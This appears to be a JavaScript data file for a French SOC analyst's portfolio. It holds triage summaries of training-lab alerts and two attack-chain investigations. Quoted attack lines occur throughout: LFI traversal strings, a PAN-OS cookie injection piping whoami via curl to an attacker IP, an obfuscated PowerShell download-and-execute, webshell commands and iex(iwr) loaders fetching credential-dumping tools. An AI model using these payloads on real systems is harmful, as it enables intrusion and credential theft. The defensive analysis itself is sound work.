export const reportsContent = {
    fr: {
        title: "Rapports d'Incidents",
        subtitle: "Analyses de menaces et investigations techniques.",
        viewMore: "Voir l'investigation complète",
        allAlerts: "[ → Voir toutes les investigations ]",
        // Format Court (Les Alertes SIEM/Simulateur)
        shortReports: [
            {
                id: "118",
                category: "triage",
                name: "SOC168 - Commande whoami détectée dans la requête",
                time: "28 Fév 2026, 04:12",
                severity: "HAUTE",
                verdict: "Vrai Positif",
                analysis: "Trafic malveillant venant du réseau externe Chinanet IP 61.177.172.87, signalé 4 fois sur VirusTotal, répertorié sur AbuseIPDB, non fiable sur Cisco, non présent dans notre Threat Intelligence. Ce trafic ciblait notre serveur web interne IP 172.16.17.16. L'attaquant a réussi une injection de commandes (Command Injection) via une requête HTTPS POST autorisée https[://]172.16.17.16/video/. Activité non planifiée.",
                remediation: "Serveur web isolé immédiatement. Escalade au Tier 2."
            },
            {
                id: "120",
                category: "triage",
                name: "SOC170 - Passwd trouvé dans l'URL - Possible attaqueLFI",
                time: "01 Mar 2026, 10:10",
                severity: "HAUTE",
                verdict: "Vrai Positif",
                analysis: "Requête malveillante HTTP GET venant de l'IP externe statique 106.55.45.162 (société chinoise Tencent). Cette IP est signalée 3454 fois sur AbuseIPDB pour du brute force et des attaques SSH, non signalée sur VirusTotal ni présente dans notre Threat Intelligence. L'attaque ciblait le serveur web interne WebServer1006 IP 172.16.17.13 via une tentative d'Inclusion de Fichier Local (Local File Inclusion - LFI) avec la chaîne ../../../../etc/passwd directement dans l'URL. Activité non planifiée.",
                remediation: "Correctif du code applicatif pour assainir les entrées URL."
            },
            {
                id: "113",
                category: "triage",
                name: "SOC163 - Utilisation suspecte de certutil.exe",
                time: "Mar, 01, 2022, 11:06 AM",
                severity: "MOYENNE",
                verdict: "Vrai Positif",
                analysis: "Exécution suspecte de l'utilitaire certutil.exe. Téléchargement d'un fichier suspect (nmap.zip). Action effectuée par la machine 172.16.17.22.",
                remediation: "Confinement de l'hôte. Escalade de l'incident au tier 2."
            },
            {
                id: "316",
                category: "triage",
                name: "SOC338 - Lumma Stealer - DLL Side-Loading via Phishing Click Fix",
                time: "13 mars 2025, 09:44",
                severity: "Critique",
                verdict: "Vrai Positif",
                analysis: "E-mail entrant suspect reçu le 13 mars 2025 à 09:44 depuis l'IP SMTP externe 132.232.40.201 (update@windows-update.site) vers l'adresse interne dylan@letsdefend.io. Le message contenait un lien vers hxxps[://]www[.]windows-update[.]site/ sans aucune pièce jointe. L'URL a été consultée par l'utilisateur.",
                remediation: "E-mail supprimé, poste de travail confiné."
            },
            {
                id: "1023-1020",
                category: "triage",
                name: "Script Powershell dans le dossier Téléchargements - Relation parent-enfant suspecte",
                time: "21 fév 2026 à 19:16",
                severity: "Faible",
                verdict: "Vrai Positif",
                analysis: "Sur le poste win-3450 de Michael Ascott, téléchargement du script malveillant PowerView.ps1 à l'origine de la violation de données, ainsi que l'exécution de Robocopy.exe responsable de l'exfiltration des données.",
                remediation: "Confinement du poste de la victime, blocage des flux de données sortants."
            },
            {
                id: "1005",
                category: "triage",
                name: "Pièce jointe suspecte trouvée dans un e-mail",
                time: "21 fév 2026 à 18:55",
                severity: "Faible",
                verdict: "Vrai Positif",
                analysis: "E-mail entrant provenant de l'adresse externe john@hatmakereurope.xyz vers l'adresse interne michael.ascot@tryhatme.com. Contient la pièce jointe ImportantInvoice-Febrary.zip — Utilisation d'ingénierie sociale avec un sentiment d'urgence pour inciter au clic immédiat.",
                remediation: "Suppression de l'e-mail, blocage de l'adresse de l'expéditeur, ajustement de la règle de détection des e-mails de phishing, sensibilisation du personnel au phishing."
            },
            {
                id: "1024-1022",
                category: "triage",
                name: "Lecteur réseau déconnecté d'un lecteur local - Lecteur réseau mappé sur un lecteur local",
                time: "21 fév 2026 à 19:19",
                severity: "Moyenne",
                verdict: "Vrai Positif",
                analysis: "Poste win-3450 du DG Michael Ascott. Charge utile malveillante PowerView.ps1 téléchargée par l'attaquant. Création du fichier exfilt8me.zip. Exfiltration des données vers ce fichier effectuée. Données supprimées par la suite.",
                remediation: "Confinement du poste de la victime, blocage des flux de fichiers sortants, récupération des données."
            },
            {
                id: "1025-1034",
                category: "triage",
                name: "Relation parent-enfant suspecte",
                time: "21/02/2026 18:18:06",
                severity: "Haute",
                verdict: "Vrai Positif",
                analysis: "Poste win-3450 du DG Michael Ascott. Charge utile malveillante PowerView.ps1 téléchargée par l'attaquant. Création du fichier exfilt8me.zip. Exfiltration des données vers ce fichier effectuée. Données supprimées par la suite.",
                remediation: "Confinement de l'hôte. Blocage de tout le trafic sortant. Récupération des données."
            },
            {
                id: "1003",
                category: "triage",
                name: "E-mail suspect provenant d'un domaine externe",
                time: "20/02/2026 22:19:31",
                severity: "Faible",
                verdict: "Faux Positif",
                analysis: "E-mail envoyé depuis l'adresse externe leonard@fashionindustrytrends.xyz vers l'adresse interne yani.zubair@tryhatme.com. Pas de pièce jointe, simple démarche commerciale (prospection). Rien de malveillant.",
                remediation: "Blocage de l'adresse de l'expéditeur, sensibilisation du personnel au phishing, ajustement de la règle pour bloquer les spams."
            },
            {
                id: "1002",
                category: "triage",
                name: "Relation parent-enfant suspecte",
                time: "20/02/2026 22:19:13",
                severity: "Faible",
                verdict: "Faux Positif",
                analysis: "Sur l'hôte win-3451, la ligne de commande du processus a exécuté taskhostw.exe KEYROAMING avec svchost.exe comme processus parent. Rien de suspect.",
                remediation: "Ajustement de la règle d'alerte pour éviter les faux positifs."
            },
            {
                id: "1001",
                category: "triage",
                name: "Relation parent-enfant suspecte",
                time: "20/02/2026 22:16:49",
                severity: "Faible",
                verdict: "Faux Positif",
                analysis: "Sur l'hôte win-3459 — Nom du processus : TrustedInstaller.exe — Processus parent : services.exe — Ligne de commande du processus : C:\\Windows\\servicing\\TrustedInstaller.exe. Processus normal du système.",
                remediation: "Ajustement de la règle d'alerte pour éviter les faux positifs."
            },
            {
                id: "1000",
                category: "triage",
                name: "E-mail suspect provenant d'un domaine externe",
                time: "20/02/2026 22:14:25",
                severity: "Faible",
                verdict: "Faux Positif",
                analysis: "E-mail envoyé depuis eileen@trendymillineryco.me vers support@tryhatme.com. Tentative d'ingénierie sociale pour obtenir des coordonnées bancaires. Simple spam, aucun impact négatif sur l'entreprise.",
                remediation: "Blocage de l'adresse e-mail de l'expéditeur, modification de la règle d'alerte pour ne pas intercepter le spam, modification du filtre de messagerie pour stopper le spam."
            },
            {
                id: "314",
                category: "triage",
                name: "SOC336 - Détection d'exploitation RCE Windows OLE Zero-Click (CVE-2025-21298)",
                time: "4 fév 2025 à 16:18",
                severity: "Critique",
                verdict: "Vrai Positif",
                analysis: "Le malware mail.rtf (SHA256 : df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184) n'est pas mis en quarantaine et est malveillant. Il est détecté par 27 éditeurs sur VirusTotal et référencé dans notre Threat Intel. Connexion effectuée à l'adresse C2 84.38.130.118.",
                remediation: "Confinement de l'hôte 172.16.17.137. Mise en quarantaine du malware. Blocage de l'adresse C2."
            },
            {
                id: "313",
                category: "triage",
                name: "SOC335 - Détection d'exploitation CVE-2024-49138",
                time: "22 janv 2025 à 02:37",
                severity: "Moyenne",
                verdict: "Vrai Positif",
                analysis: "Le processus malveillant svohost.exe n'a pas été mis en quarantaine. L'empreinte SHA256 : b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9 a été identifiée sur le poste 172.16.17.207. Signalé 51 fois sur VirusTotal, confirmé malveillant sur Hybrid Analysis, et associé à une CVE dans notre Threat Intel. Pas d'adresse C2 identifiée.",
                remediation: "Mise en quarantaine du processus. Confinement de l'hôte. Escalade au niveau 2 (Tier 2)."
            },
            {
                id: "304",
                category: "triage",
                name: "SOC326 - Détection d'usurpation d'identité via modification d'enregistrement MX",
                time: "17 sept 2024 à 12:05",
                severity: "Moyenne",
                verdict: "Vrai Positif",
                analysis: "E-mail envoyé le 17 septembre 2024 à 12:05 depuis l'adresse no-reply@cti-report.io (SMTP 64.233.180.27) vers soc@letsdefend.io. Pas de pièce jointe, contient 2 URL (letsdefwnd[.]io et mail.mailerhost[.]net). Les URL ne sont pas malveillantes, mais le domaine typosquatté letsdefwnd[.]io est marqué pour phishing dans notre Threat Intel.",
                remediation: "Blocage des deux URL. Sensibilisation du personnel au phishing."
            },
            {
                id: "263",
                category: "triage",
                name: "SOC287 - Lecture de fichier arbitraire sur Checkpoint Security Gateway [CVE-2024-24919]",
                time: "6 juin 2024 à 15:12",
                severity: "Haute",
                verdict: "Vrai Positif",
                analysis: "Requête externe malveillante HTTP POST en provenance de l'IP 203.160.68.12 (hébergée par China Unicom). IP signalée deux fois sur VirusTotal, deux fois sur AbuseIPDB et liée à une CVE dans notre Threat Intel. L'attaque ciblait le serveur interne CP-Spark-Gateway-01 (IP 172.16.20.146). Tentative d'Inclusion de Fichier Local avec traversée de répertoires via les chemins aCSHELL/../../../../../../../../../../etc/passwd et aCSHELL/../../../../../../../../../../etc/shadow sur l'URL 172.16.20.146/clients/MyCRL. Attaque réussie selon les logs et les connexions réseau du poste. Il ne s'agit pas d'un test planifié.",
                remediation: "Confinement de l'hôte, blocage de l'IP malveillante, escalade au niveau 2 (Tier 2), correction de la vulnérabilité de traversée de répertoires."
            },
            {
                id: "257",
                category: "triage",
                name: "SOC282 - Alerte de Phishing - Détection d'un e-mail trompeur",
                time: "13 mai 2024 à 09:22",
                severity: "Moyenne",
                verdict: "Vrai Positif",
                analysis: "E-mail envoyé le 13 mai 2024 à 09:22 depuis l'adresse free@coffeeshooop.com (SMTP 103.80.134.63) vers Felix@letsdefend.io. Le message utilise l'ingénierie sociale pour inciter à cliquer sur le lien https[://]download.cyberlearn.academy/download/download?url=https[://]files-ld.s3.us-east-2.amazonaws.com/59cbd215-76ea-434d-93ca-4d6aec3bac98-free-coffee.zip, déclenchant le téléchargement de la pièce jointe free-coffee[.]zip. Le lien est marqué comme malveillant par 11 éditeurs sur VirusTotal. L'e-mail a été distribué à l'utilisateur, le lien a été cliqué et l'adresse a été consultée.",
                remediation: "Suppression de l'e-mail. Confinement de l'hôte. Sensibilisation du personnel au phishing. Blocage du serveur SMTP, de l'adresse de l'expéditeur, du lien et de la pièce jointe."
            },
            {
                id: "249",
                category: "triage",
                name: "SOC274 - Exploitation de la vulnérabilité d'injection de commandes Palo Alto Networks PAN-OS (CVE-2024-3400)",
                time: "18 avr 2024 à 03:09",
                severity: "Critique",
                verdict: "Vrai Positif",
                analysis: "Injection de commandes en provenance de l'IP externe 144.172.79.92 (hébergeur Frantech Solutions), signalée 11 fois sur VirusTotal, 1 rapport sur AbuseIPDB et confirmée malveillante dans notre Threat Intel. L'attaque ciblait l'IP interne 172.16.17.139 (PA-Firewall-01) via une requête HTTP POST vers l'URL 172.16.17.139/global-protect/login.esp. L'injection a été injectée dans les cookies : SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}144.172.79.92:4444?user=$(whoami). Il ne s'agit pas d'un test planifié. L'attaque a réussi, comme le confirment les logs bruts du système de destination (dt_send INFO TX FILE: send_fname: /opt/panlogs/tmp/device_telemetry/day/aaa`curl...) ainsi qu'une connexion réseau établie vers l'IP malveillante au même moment.",
                remediation: "Confinement de l'hôte. Escalade au niveau 2. Correction du problème d'injection."
            },
            {
                id: "238",
                category: "triage",
                name: "SOC153 - Exécution d'un script Powershell suspect",
                time: "13 fév 2026 à 20:37",
                severity: "Moyenne",
                verdict: "Vrai Positif",
                analysis: "Le script PowerShell payload.ps1, signalé comme malveillant par 31 éditeurs sur VirusTotal non répertorié dans notre Threat Intel, a été exécuté sur le poste de Tony (IP 172.16.17.206). Le script a contacté l'adresse C2 hxxps[://]kionagranada[.]com/upload/beauty[.]exe, elle-même détectée par 9 éditeurs sur VirusTotal.",
                remediation: "Confinement de l'hôte. Élimination complète de la charge utile (payload)."
            },
            {
                id: "235",
                category: "triage",
                name: "Détection d'une injection SQL",
                time: "7 mars 2024 à 12:51",
                severity: "Haute",
                verdict: "Vrai Positif",
                analysis: "L'IP malveillante chinoise 118.194.247[.]28 détectée par 9 éditeurs sur VirusTotal, signalée 4204 fois pour brute force et attaques SSH sur AbuseIPDB, non fiable sur Cisco Talos, non répertoriée dans notre Threat Intel, a mené une injection SQL ciblant notre serveur interne WebServer1000 IP : 172.16.20.12. Le log ayant déclenché l'alerte contient des traces d'injection SQL, de Cross-Site Scripting (XSS), de RCE (exécution de code à distance) et de LFI (inclusion de fichiers locaux), avec le user-agent : sqlmap/1.7.2. 20 logs supplémentaires montrent l'utilisation des mêmes méthodes. Il ne s'agit pas d'un test planifié. L'attaque a réussi, comme le prouvent les lignes de commande exécutées sur la cible et les codes de statut HTTP 200.",
                remediation: "Confinement de l'hôte. Blocage du trafic provenant de l'IP 118.194.247[.]28. Vérification des autres postes pour détecter un éventuel déplacement latéral. Correction du code pour bloquer les injections SQL."
            },
            {
                id: "234",
                category: "triage",
                name: "Détection de brute force RDP",
                time: "7 mars 2024 à 11:44",
                severity: "Moyenne",
                verdict: "Vrai Positif",
                analysis: "L'IP externe 218.92.0.56 signalée 7 fois sur VirusTotal, marquée comme malveillante dans notre Threat Intel, répertoriée 400 000 fois sur AbuseIPDB a mené une attaque par force brute sur le poste 172.16.17.148. De multiples échecs de connexion ont été observés sur le port RDP 3389, suivis d'une connexion réussie. L'activité réseau enregistrée sur le poste de la victime avec l'IP 218.92.0.56 confirme l'authentification. Dans l'historique du terminal à 11:46 juste après le brute force, des commandes de reconnaissance (discovery) sont visibles. Le processus tvnserver.exe a été lancé à 11:45 et des fichiers suspects ont été installés par la suite.",
                remediation: "Confinement de l'hôte. Blocage de l'IP 218.92.0.56 pour les accès RDP. Vérification de la présence de cette IP sur d'autres postes. Surveillance accrue des échecs de connexion répétés."
            },
            {
                id: "8817",
                category: "triage",
                name: "E-mail entrant contenant un lien externe suspect",
                time: "11/02/2026 09:41:12",
                severity: "Moyenne",
                verdict: "Vrai Positif",
                analysis: "E-mail suspect envoyé depuis l'adresse no-reply@m1crosoftsupport.co vers c.allen@thetrydaily.thm. L'expéditeur usurpe l'identité du support Microsoft en utilisant l'ingénierie sociale et le typosquatting, avec un lien suspect incitant au clic : hxxps[://]m1crosoftsupport[.]co/login. Les logs ne montrent aucune preuve que l'utilisateur a cliqué ou tenté d'accéder au lien.",
                remediation: "Blocage de l'adresse de l'expéditeur. Ajout du lien dans la liste des URL bloquées au niveau du pare-feu. Suppression de l'e-mail. Envoi d'une alerte interne pour informer le personnel de cette campagne de phishing en cours."
            },
            {
                id: "8815-8816",
                category: "triage",
                name: "E-mail entrant contenant un lien externe suspect - Accès à une URL externe sur liste noire bloqué par le pare-feu",
                time: "11/02/2026 09:38:08",
                severity: "Haute",
                verdict: "Vrai Positif",
                analysis: "L'utilisateur (IP : 10.20.2.17) a cliqué sur une URL suspecte : hxxp[://]bit[.]ly/3sHkX3da12340. L'accès a été bloqué par le pare-feu. L'URL est signalée par un éditeur sur VirusTotal pour phishing. L'e-mail, envoyé depuis urgents@amazon.biz, usurpe l'identité d'Amazon et crée un sentiment d'urgence pour inciter au clic. L'IP 67.199.248.11 liée à cette URL, est signalée 848 fois sur AbuseIPDB pour phishing, spam web et spam par e-mail.",
                remediation: "Blocage de l'adresse de l'expéditeur, blocage de l'IP liée au lien, rappel aux équipes concernant les e-mails de phishing."
            },
            {
                id: "8814",
                category: "triage",
                name: "E-mail entrant contenant un lien externe suspect",
                time: "11/02/2026 09:37:45",
                severity: "Moyenne",
                verdict: "Vrai Positif",
                analysis: "E-mail suspect envoyé depuis onboarding@hrconnex.thm vers j.garcia@thetrydaily.thm. Le message usurpe l'identité d'un service de validation d'intégration (onboarding) et contient un lien suspect : hxxps[://]hrconnex[.]thm/onboarding/15400654060/j[.]garcia. Les logs ne montrent aucune preuve que Julia Garcia a cliqué ou tenté d'accéder au lien.",
                remediation: "Blocage de l'adresse e-mail de l'expéditeur."
            },
            {
                id: "214",
                category: "triage",
                name: "SOC251 - Détection de Quishing (Phishing par code QR)",
                time: "1 janv 2024 à 12:37",
                severity: "Moyenne",
                verdict: "Vrai Positif",
                analysis: "IP SMTP : 158.69.201.47 (marquée pour phishing dans notre Threat Intel, signalée 340 fois sur AbuseIPDB pour injection SQL, force brute, bot web malveillant et attaque d'application web, détectée malveillante par 6 éditeurs sur VirusTotal pour phishing). Adresse source : security@microsecmfa.com (suspecte et ne correspondant pas à un compte Microsoft valide). Adresse de destination : claire@letsdefend.io. Heure de l'e-mail : 1 janvier 2024 à 12:00. L'e-mail prétend provenir de l'équipe Microsoft et utilise l'ingénierie sociale (urgence et usurpation d'identité) pour pousser l'utilisateur à scanner le code QR. Aucune preuve que le code ait été scanné sur le poste de la victime.",
                remediation: "Suppression de l'e-mail, signalement et blocage de l'IP malveillante. Blocage de l'adresse e-mail de l'expéditeur."
            },
            {
                id: "225",
                category: "triage",
                name: "SOC257 - Connexion VPN détectée depuis un pays non autorisé",
                time: "13/02/2024 02:04",
                severity: "Faible",
                verdict: "Vrai Positif",
                analysis: "L'utilisatrice monica@letsdefend.io a reçu un e-mail provenant de security@letsdefend.io IP 113.161.158.12, signalée comme malveillante par deux éditeurs sur VirusTotal et pour brute force dans notre Threat Intel. Il s'agit de 3 e-mails distincts contenant un mot de passe unique (OTP) pour activer l'authentification multifacteur ainsi qu'un lien https://vpn-letsdefend.io. Sur le poste de la victime, on observe le processus parent suspect « sihost.exe » exécutant le processus 'C:\\Windows\\system32\\BackgroundTaskHost.exe' -ServerName:BackgroundTaskHost.WebAccountProvider. De multiples commandes suspectes de reconnaissance ont été lancées dans le terminal : systeminfo, ipconfig /all, netstat -ano, tasklist, ver, driverquery, net user, wmic product get name. Tous les logs de l'IP malveillante 113.161.158.12 convergent vers l'IP 33.33.33.33.",
                remediation: "Confinement de l'hôte."
            },
            {
                id: "320",
                category: "triage",
                name: "SOC342 - CVE-2025-53770 Contournement d'authentification et RCE SharePoint ToolShell",
                time: "22/07/2025 13:07",
                severity: "Critique",
                verdict: "Vrai Positif",
                analysis: "IP source 107.191.58.76 — IP de destination 172.16.20.17 — Nom d'hôte : SharePoint01 — Requête POST vers /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx avec une taille de contenu (content-length) anormalement élevée. Connexion réseau confirmée à 13:08 entre l'hôte SharePoint01 et l'IP source 107.191.58.76. Exécution d'un fichier suspect issu de la requête POST constatée dans les lignes de commande de l'hôte.",
                remediation: "Confinement de l'hôte effectué et escalade au niveau 2 (Tier 2)."
            },
            {
                id: "119",
                category: "triage",
                name: "SOC169 - Détection d'une attaque IDOR potentielle",
                time: "28 fév 2022 à 22:48",
                severity: "Moyenne",
                verdict: "Vrai Positif",
                analysis: "Requêtes malveillantes POST en provenance de l'IP externe 134.209.118.137 (signalée sur AbuseIPDB et Cisco Talos, non répertoriée dans notre Threat Intel). L'attaque ciblait le serveur web interne 172.16.17.15. Attaque IDOR réussie sur l'URL https://172.16.17.15/get_user_info/?user_id=1. Il ne s'agit pas d'une activité planifiée.",
                remediation: "Isoler le serveur web. Escalader au Tier 2."
            },
            {
                id: "114",
                category: "triage",
                name: "SOC164 - Comportement suspect de Mshta",
                time: "5 mars 2022 à 10:29",
                severity: "Haute",
                verdict: "Vrai Positif",
                analysis: "Le LOLbin mshta est utilisé pour exécuter un script PowerShell sur le poste 172.16.17.38. Le script a tenté de télécharger un fichier, mais l'action a échoué car bloquée par le pare-feu. Lignes de commande : C:/Windows/System32/mshta.exe C:/Users/roberto/Desktop/Ps1.hta et C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe function H1($i) {$r = '' ;for ($n = 0; $n -Lt $i.LengtH; $n += 2){$r += [cHar]int)}return $r};$H2 = (new-object ('{1}{0}{2}' -f'WebCL','net.','ient'));$H3 = H1 '446f776E';$H4 = H1 '6C6f';$H5 = H1 '616473747269';$H6 = H1 '6E67';$H7 = $H3+$H4+$H5+$H6;$H8 = $H2.$H7('http://193.142.58.23/Server.txt');iEX $H8.",
                remediation: "Confinement du poste de travail."
            },
            {
                id: "123",
                category: "triage",
                name: "SOC173 - Détection du Zero-Day Follina",
                time: "2 juin 2022 à 15:22",
                severity: "Moyenne",
                verdict: "Vrai Positif",
                analysis: "Le cheval de Troie (MD5 : 52945af1def85b171870b31fa4782e52) exécuté sur le poste 172.16.17.39 n'est pas mis en quarantaine et s'est connecté à l'adresse C2 https[://]www.xmlformats.com/office/word/2022.",
                remediation: "Confinement de l'hôte."
            },
            {
                id: "125",
                category: "triage",
                name: "SOC175 - PowerShell détecté dans l'URL requise - Exploitation potentielle de la CVE-2022-41082",
                time: "30 sept 2022 à 07:19",
                severity: "Haute",
                verdict: "Vrai Positif",
                analysis: "Trafic malveillant en provenance de l'IP coréenne 58.237.200.6 (signalée sur AbuseIPDB, non présente dans notre Threat Intel) ciblant l'IP du serveur d'échange interne 172.16.20.8. Échec de la tentative d'exécution de commande PowerShell à distance via l'URL /autodiscover/autodiscover.json?@evil.com/owa/&Email=autodiscover/autodiscover.json%3f@evil.com&Protocol=XYZ&FooProtocol=Powershell. Il ne s'agit pas d'un test planifié.",
                remediation: "Ne pas escalader."
            }
        ],

        // Format Long (Rapports d'Investigation Complets)
        longReports:[
            {
                id: "thm-slingshot",
                category: "investigation",
                name: "Slingshot (TryHackme)",
                severity: "CRITIQUE",
                summary: "L'analyse des logs d'audit montre une compromission complète du serveur web (172.16.17.16) par un attaquant externe (10.0.2.15). Après une phase de reconnaissance et un brute-force réussi, l'attaquant a exploité des vulnérabilités de téléchargement et d'inclusion de fichiers (LFI) pour s'emparer des accès de la base de données, exfiltrer des informations bancaires critiques et altérer l'intégrité des tables.",
                macrophases: [
                    {
                        name: "Phase Initiale",
                        steps: [
                            {
                                title: "1 - RECONNAISSANCE ET ÉNUMÉRATION",
                                desc: `L'attaquant a commencé par cartographier l'application web à l’aide d’outils automatisés.
                                        Puis il a utilisé le moteur de script nmap pour énumérer les répertoires, analyser les en-têtes et détecter des vulnérabilités.
                                        L'outil Gobuster est ensuite utilisé pour énumérer les dossiers. La page /admin a été découverte (code de réponse HTTP 301) ainsi que 9 autres pages (code de réponse HTTP 200), incluant un répertoire de stockage (stocking) contenant un flag compromis.`,
                                code: `GET /robots.txt HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) 
Source IP: 10.0.2.15 | Status: 200 OK
GET /backups/?flag=a76637b62ea99acda12f5859313f539a HTTP/1.1
Source IP: 10.0.2.15 | Status: 200 OK`
                            },
                            {
                                title: "2 - EXÉCUTION INITIALE ET DÉCOUVERTE",
                                desc: "Un webshell PHP a ensuite été téléchargé par l'attaquant pour obtenir une exécution de commandes à distance (RCE) sur le serveur web. Plusieurs commandes de découverte (Discovery) ont été exécutées. Une traversée de répertoire (Directory Traversal) a été exploitée par l'attaquant pour trouver les identifiants de la base de données. Il obtient ainsi accès à la base de données phpMyAdmin via une inclusion de fichier local en utilisant un wrapper PHP.",
                                code: `/admin/upload.php?action=upload Mozilla/5.0 (X11; Linux
x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 10.0.2.15 302 POST
name="file";
filename="easy-simple-php-webshell.php"
/uploads/easy-simple-php-webshell.php?cmd=whoami
/uploads/easy-simple-php-webshell.php?cmd=pwd
/uploads/easy-simple-php-webshell.php?cmd=ls
/uploads/easy-simple-php-webshell.php?cmd=which+nc
Directory traversal is used by the attacker to find database credentials and obtains access to the phpmyadmin database by local file inclusion with a php wrapper
/admin/settings.php?page=../../../../../../../../etc/passwd
/admin/settings.php?page=../../../../../../../../proc/self/environ
/admin/settings.php?page=../../../../../../../../etc/phpmyadmin/config-db.php
/admin/settings.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../etc/phpmyadmin/config-db.php`
                            }
                        ]
                    },
                    {
                        name: "Phase Active",
                        steps: [
                            {
                                title: "3 - ACCÈS INITIAL",
                                desc: "L’outil Hydra est utilisé pour brute force la login page avec succès avec la paire identifiant:password admin:thx1138.",
                                code: "/admin-login.php Mozilla/4.0 (Hydra) 10.0.2.15 200 GET"
                            },
                            {
                                title: "4 - EXFILTRATION DE DONNÉES",
                                desc: "L’attaquant a accédé à la base de données customer_credit_cards et la table credit_cards.",
                                code: `/admin-login.php Mozilla/4.0 (Hydra) 10.0.2.15 200 GET
/phpmyadmin/tbl_export.php?db=customer_credit_cards&table=credit_cards&single_table=true`
                            }
                        ]
                    },
                    {
                        name: "Phase Finale",
                        steps: [
                            {
                                title: "5 - MANIPULATION DE DONNÉES",
                                desc: "L’attaquant ajoute une nouvelle entrée dans la base de données customer_credit_cards.",
                                code: `/phpmyadmin/import.phpis_js_confirmed=0&db=customer_credit_cards&table=credit_cards&token=302e562342217c5d6258344222294172&pos=0&goto=tbl_sql.php&message_to_show=YourSQL query has been executed successfully.&prev_sql_query=INSERT INTO'credit_cards' ('card_number', 'cardholder_name', 'expiration_date', 'cvv')VALUES ('000', 'c6aa3215a7d519eeb40a660f3b76e64c', '000','000');&sql_query=INSERT INTO 'credit_cards' ('card_number','cardholder_name', 'expiration_date', 'cvv') VALUES ('000', 'c6aa3215a7d519eeb40a660f3b76e64c','000','000');&sql_delimiter=;&show_query=1&fk_checks=0&fk_checks=1&SQL=Go&ajax_request=true&ajax_page_request=true&_nocache=169038208497548768&token=302e562342217c5d6258344222294172`,
                            },
                            {
                                title: "6 - CONFIRMATION",
                                desc: "L’attaquant exporte de nouveau la table credit_cards.",
                                code: "/phpmyadmin/tbl_export.php?db=customer_credit_cards&table=credit_cards&single_table=true"
                            }
                        ]
                    }
                ]
            },
            {
                id: "thm-hunt-me2",
                category: "investigation",
                name: "Hunt Me II (TryHackme)",
                severity: "Critique",
                summary: "Ce rapport documente une compromission critique du réseau d'entreprise ayant entraîné le contrôle total de l'Active Directory et le déploiement d'un ransomware sur deux postes de travail. L’'attaque a débuté avec du Malvertising (publicité malveillante) : un utilisateur cherchant un logiciel a téléchargé sans le savoir un installateur piégé depuis un domaine similaire au vrai site (typosquatting). L'attaquant a immédiatement obtenu des privilèges d'administrateur local et a déployé un service Windows persistant pour établir un canal de connexion (C2). Grâce à une extraction massive d'identifiants, à l'exploration de l'Active Directory interne et à des déplacements latéraux, l'acteur malicieux a réussi à détourner des comptes à privilèges élevés avant de déployer un ransomware (bomb.exe) pour chiffrer les données sensibles de plusieurs postes de travail.",
                macrophases: [
                    {
                        name: "Phase Initiale",
                        steps: [
                            {
                                title: "1 - ACCÈS INITIAL",
                                desc: "L'utilisateur, ayant besoin d'extraire un fichier, a recherché « 7-Zip » et a cliqué sans le savoir sur un lien sponsorisé menant à un domaine frauduleux (7zipp[.]org).",
                                code: `C:\\Users\\perry.parsons\\Downloads\\7z2301-x64.msi
hxxp[://]www[.]7zipp[.]org/a/7z2301-x64[.]msi
IP: 206.189.34.218`
                            },
                            {
                                title: "2 - EXÉCUTION & ÉLÉVATION DE PRIVILÈGES",
                                desc: "L'utilitaire natif de Windows msiexec.exe a lancé l'installateur malveillant. Lors de son exécution, l'installateur a profité des privilèges du système pour élever les droits de l'attaquant au rang de NT AUTHORITY\\SYSTEM, puis a ouvert une connexion PowerShell sans fichier (fileless) pour récupérer un second payload.",
                                code: `"C:\\Windows\\System32\\msiexec.exe" /i "C:\\Users\\perry.parsons\\Downloads\\7z2301-x64.msi”
powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)`
                            },
                            {
                                title: "3 - ÉVASION DE DÉFENSE",
                                desc: "Le script télécharge et installe la version légitime de l'application 7-Zip en arrière-plan pour masquer le comportement malveillant et éviter d’éveiller les soupçons de l'utilisateur.",
                                code: "iwr hxxps[://]www[.]7-zip[.]org/a/7z2301-x64[.]exe -outfile C:\\Windows\\Temp\\7zlegit.exe"
                            }
                        ]
                    },
                    {
                        name: "Phase Active",
                        steps: [
                            {
                                title: "4 - PERSISTANCE",
                                desc: "Un fichier 7zipp.exe est téléchargé et associé à un service nouvellement créé nommé 7zservice, configuré pour s'exécuter de manière automatique à chaque démarrage du système afin de garantir un accès permanent. Le service est ensuite lancé ce qui télécharge un fichier 7zip.dll qui, une fois exécuté, se reconnecte au serveur de l'attaquant.",
                                code: `C:\\Program Files\\7-Zip\\7zipp.exe
"C:\\Windows\\system32\\sc.exe" create 7zService binpath= "C:\\Program Files\\7-zip\\7zipp.exe" start=auto obj=LocalSystem
"C:\\Windows\\system32\\sc.exe" start 7zService

"C:\\Windows\\system32\\rundll32.exe" "C:\\Program Files\\7-zip\\7zipp.dll",Start
-C iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-NanoDump.ps1 -useb); Invoke-Nanodump;`
                            },
                            {
                                title: "5 - ACCÈS AUX IDENTIFIANTS ET RECONNAISSANCE ACTIVE DIRECTORY",
                                desc: "L'attaquant commence à collecter des identifiants et à cartographier le domaine de l'entreprise. Il exécute Invoke-NanoDump directement en mémoire pour extraire les identifiants du processus LSASS, en cachant le fichier de sortie en faux journal d'événements (trash.evtx), puis utilise Invoke-PowerExtract pour l'analyser. SharpHound est exécuté pour observer la structure de l'Active Directory et trouver des chemins d'attaque. Enfin, l'attaquant télécharge mimikatz pour récupérer des cleartext secrets et réussit une attaque de type Pass-the-Hash (sekurlsa::pth) pour utiliser la session active de l'utilisateur james.cromwell.",
                                code: `-C iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-NanoDump.ps1 -useb); Invoke-Nanodump;
-C iex(iwr http://206.189.34.218/a/pwrex.ps1 -useb); Invoke-PowerExtract -PathToDMP C:\\windows\\temp\\trash.evtx;

